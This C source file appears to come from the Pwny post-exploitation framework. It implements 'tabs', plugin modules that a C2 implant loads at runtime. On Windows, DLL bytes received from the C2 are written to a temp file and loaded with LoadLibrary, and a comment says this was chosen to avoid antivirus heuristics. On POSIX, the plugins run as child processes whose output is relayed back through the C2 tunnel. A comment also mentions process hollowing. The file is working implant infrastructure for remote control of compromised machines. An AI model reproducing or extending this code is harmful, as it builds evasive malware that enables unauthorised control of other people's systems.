/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <ev.h>

#include <pwny/tabs.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/log.h>
#include <pwny/tlv.h>
#include <pwny/queue.h>
#include <pwny/group.h>

#include <uthash/uthash.h>

#ifdef __windows__

/*
 * =============================================================
 * Windows: In-process DLL tabs via standard LoadLibrary.
 *
 * Each tab DLL exports a TabInit function that receives a
 * pointer to the tab's private api_calls hash table. The DLL
 * registers its handlers there. When a request comes in with
 * TLV_TYPE_TAB_ID, tabs_lookup dispatches directly via
 * api_call_make — no child process, no pipes, no IPC.
 *
 * For memory-buffer loads: write to temp file → LoadLibraryA.
 * This avoids embedding a manual PE mapper (VirtualAlloc +
 * section copy + relocation + import resolution) which is a
 * major AV heuristic trigger.
 * =============================================================
 */

#include <windows.h>

/* Tab DLL init prototype:
 *   void TabInit(api_calls_t **api_calls);
 * The DLL calls api_call_register() on the provided table. */
typedef void (*tab_init_t)(api_calls_t **api_calls);

/*
 * Write raw DLL bytes to a temp file and return the path.
 * Caller must free() the returned string and delete the file.
 */
static char *write_temp_dll(unsigned char *image, size_t length)
{
    char temp_dir[MAX_PATH];
    char *temp_file;
    HANDLE hFile;
    DWORD written;

    if (GetTempPathA(MAX_PATH, temp_dir) == 0)
    {
        return NULL;
    }

    temp_file = calloc(MAX_PATH, sizeof(char));
    if (temp_file == NULL)
    {
        return NULL;
    }

    if (GetTempFileNameA(temp_dir, "tw", 0, temp_file) == 0)
    {
        free(temp_file);
        return NULL;
    }

    hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL,
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        DeleteFileA(temp_file);
        free(temp_file);
        return NULL;
    }

    if (!WriteFile(hFile, image, (DWORD)length, &written, NULL) ||
        written != (DWORD)length)
    {
        CloseHandle(hFile);
        DeleteFileA(temp_file);
        free(temp_file);
        return NULL;
    }

    CloseHandle(hFile);
    return temp_file;
}

int tabs_add(tabs_t **tabs, int id,
             char *filename,
             unsigned char *image,
             size_t length,
             c2_t *c2)
{
    tabs_t *tab;
    tabs_t *tab_new;
    HMODULE hMod;
    tab_init_t pfnTabInit;
    char *temp_path = NULL;

    HASH_FIND_INT(*tabs, &id, tab);
    if (tab != NULL)
    {
        return -1;
    }

    /* Load the DLL via standard Windows loader */
    if (image != NULL && length > 0)
    {
        /* Memory buffer — write to temp file first */
        temp_path = write_temp_dll(image, length);
        if (temp_path == NULL)
        {
            log_debug("* tabs: failed to write temp DLL\n");
            return -1;
        }
        hMod = LoadLibraryA(temp_path);
    }
    else if (filename != NULL)
    {
        /* Load directly from disk */
        hMod = LoadLibraryA(filename);
    }
    else
    {
        return -1;
    }

    if (hMod == NULL)
    {
        log_debug("* tabs: LoadLibrary failed (%lu)\n", GetLastError());
        if (temp_path)
        {
            DeleteFileA(temp_path);
            free(temp_path);
        }
        return -1;
    }

    /* Resolve TabInit from the loaded DLL */
    pfnTabInit = (tab_init_t)GetProcAddress(hMod, "TabInit");

    if (pfnTabInit == NULL)
    {
        log_debug("* tabs: TabInit export not found\n");
        FreeLibrary(hMod);
        if (temp_path)
        {
            DeleteFileA(temp_path);
            free(temp_path);
        }
        return -1;
    }

    tab_new = calloc(1, sizeof(*tab_new));
    if (tab_new == NULL)
    {
        FreeLibrary(hMod);
        if (temp_path)
        {
            DeleteFileA(temp_path);
            free(temp_path);
        }
        return -1;
    }

    tab_new->id = id;
    tab_new->c2 = c2;
    tab_new->hModule = hMod;
    tab_new->temp_path = temp_path;
    tab_new->api_calls = NULL;

    /* Let the DLL register its handlers */
    pfnTabInit(&tab_new->api_calls);

    HASH_ADD_INT(*tabs, id, tab_new);
    log_debug("* Added DLL TAB entry (%d)\n", id);
    return 0;
}

int tabs_lookup(tabs_t **tabs, int id, tlv_pkt_t *tlv_pkt)
{
    tabs_t *tab;
    int tag;
    tlv_pkt_t *result;

    log_debug("* Searching for TAB entry (%d)\n", id);
    HASH_FIND_INT(*tabs, &id, tab);

    if (tab == NULL)
    {
        log_debug("* TAB was not found (%d)\n", id);
        return -1;
    }

    log_debug("* Found DLL TAB entry (%d)\n", id);

    if (tlv_pkt_get_u32(tlv_pkt, TLV_TYPE_TAG, &tag) < 0)
    {
        return -1;
    }

    /* Set request on the C2 and dispatch directly in-process */
    tab->c2->request = tlv_pkt;

    if (api_call_make(&tab->api_calls, tab->c2, tag, &result) != 0)
    {
        result = api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED, tlv_pkt);
    }

    if (result != NULL)
    {
        tab->c2->response = result;

        /* Send the response back through the C2 tunnel */
        if (c2_enqueue_tlv(tab->c2, result) == 0)
        {
            if (tab->c2->write_link)
            {
                tab->c2->write_link(tab->c2->link_data);
            }
        }

        tlv_pkt_destroy(result);
        tab->c2->response = NULL;
    }

    return 0;
}

int tabs_delete(tabs_t **tabs, int id)
{
    tabs_t *tab;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab != NULL)
    {
        if (tab->api_calls)
        {
            api_calls_free(tab->api_calls);
        }

        if (tab->hModule)
        {
            FreeLibrary(tab->hModule);
        }

        if (tab->temp_path)
        {
            DeleteFileA(tab->temp_path);
            free(tab->temp_path);
        }

        HASH_DEL(*tabs, tab);
        free(tab);

        log_debug("* Deleted DLL TAB entry (%d)\n", id);
        return 0;
    }

    return -1;
}

void tabs_free(tabs_t *tabs)
{
    tabs_t *tab;
    tabs_t *tab_tmp;

    HASH_ITER(hh, tabs, tab, tab_tmp)
    {
        log_debug("* Freed DLL TAB entry (%d)\n", tab->id);
        HASH_DEL(tabs, tab);

        if (tab->api_calls)
        {
            api_calls_free(tab->api_calls);
        }

        if (tab->hModule)
        {
            FreeLibrary(tab->hModule);
        }

        if (tab->temp_path)
        {
            DeleteFileA(tab->temp_path);
            free(tab->temp_path);
        }

        free(tab);
    }

    free(tabs);
}

/* Unused on Windows but declared in header for compatibility */
void tabs_err(void *data) { (void)data; }
void tabs_out(void *data) { (void)data; }

#else /* POSIX */

/*
 * =============================================================
 * POSIX: Child-process tabs with pipe-based IPC.
 *
 * Each tab is a standalone executable spawned via fork/exec
 * (or process hollowing on Windows). Communication happens
 * over inherited stdin/stdout pipes using TLV group framing.
 * =============================================================
 */

#include <pwny/link.h>

extern char **environ;

void tabs_err(void *data)
{
    tabs_t *tab;
    queue_t *queue;
    char *message;
    size_t length;

    tab = data;
    queue = tab->child->err_queue.queue;
    length = queue->bytes;
    message = malloc(length + 1);

    if (message != NULL)
    {
        queue_remove(queue, (void *)message, length);
        message[length] = '\0';

        log_debug("[id: %d, pid: %d] %s\n", tab->id, tab->child->pid, message);
        free(message);
    }
}

void tabs_exit(void *data)
{
    tabs_t *tab;

    tab = data;
    (void)tab;
}

void tabs_out(void *data)
{
    tabs_t *tab;
    tlv_pkt_t *tlv_pkt;
    queue_t *queue;

    tab = data;
    queue = tab->child->out_queue.queue;

    if (group_tlv_dequeue(queue, &tlv_pkt, NULL) > 0)
    {
        group_tlv_enqueue(tab->c2->tunnel->egress, tlv_pkt, tab->c2->crypt);
        tlv_pkt_destroy(tlv_pkt);
    }

    if (tab->c2->write_link)
    {
        tab->c2->write_link(tab->c2->link_data);
    }
}

int tabs_add(tabs_t **tabs, int id,
             char *filename,
             unsigned char *image,
             size_t length,
             c2_t *c2)
{
    tabs_t *tab;
    tabs_t *tab_new;
    child_options_t options;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab == NULL)
    {
        tab_new = calloc(1, sizeof(*tab_new));

        if (tab_new != NULL)
        {
            options.args = NULL;
            options.env = environ;
            options.flags = CHILD_FORK;
            options.length = length;

            tab_new->id = id;
            tab_new->c2 = c2;
            tab_new->child = child_create(filename, image, &options);

            if (tab_new->child == NULL)
            {
                free(tab_new);
                return -1;
            }

            child_set_links(tab_new->child,
                            tabs_out, tabs_err, tabs_exit,
                            tab_new);
            HASH_ADD_INT(*tabs, id, tab_new);
            log_debug("* Added TAB entry (%d) (pid: %d)\n", id, tab_new->child->pid);
            return 0;
        }
    }

    return -1;
}

int tabs_lookup(tabs_t **tabs, int id, tlv_pkt_t *tlv_pkt)
{
    tabs_t *tab;
    group_t *group;

    log_debug("* Searching for TAB entry (%d)\n", id);
    HASH_FIND_INT(*tabs, &id, tab);

    if (tab != NULL)
    {
        log_debug("* Found TAB entry (%d)\n", id);

        group = group_create(tlv_pkt, NULL);

        log_debug("* Writing (%d) bytes to TAB\n", group->bytes);
        child_write(tab->child, group->buffer, group->bytes);

        group_destroy(group);
        return 0;
    }

    log_debug("* TAB was not found (%d)\n", id);
    return -1;
}

int tabs_delete(tabs_t **tabs, int id)
{
    tabs_t *tab;

    HASH_FIND_INT(*tabs, &id, tab);

    if (tab != NULL)
    {
        child_destroy(tab->child);
        HASH_DEL(*tabs, tab);
        free(tab);

        log_debug("* Deleted TAB entry (%d)\n", id);
        return 0;
    }

    return -1;
}

void tabs_free(tabs_t *tabs)
{
    tabs_t *tab;
    tabs_t *tab_tmp;

    HASH_ITER(hh, tabs, tab, tab_tmp)
    {
        log_debug("* Freed TAB entry (%d)\n", tab->id);
        HASH_DEL(tabs, tab);

        if (tab->child)
        {
            if (tab->child->status == CHILD_ALIVE)
            {
                child_kill(tab->child);
            }

            child_destroy(tab->child);
        }

        free(tab);
    }

    free(tabs);
}

#endif /* __windows__ */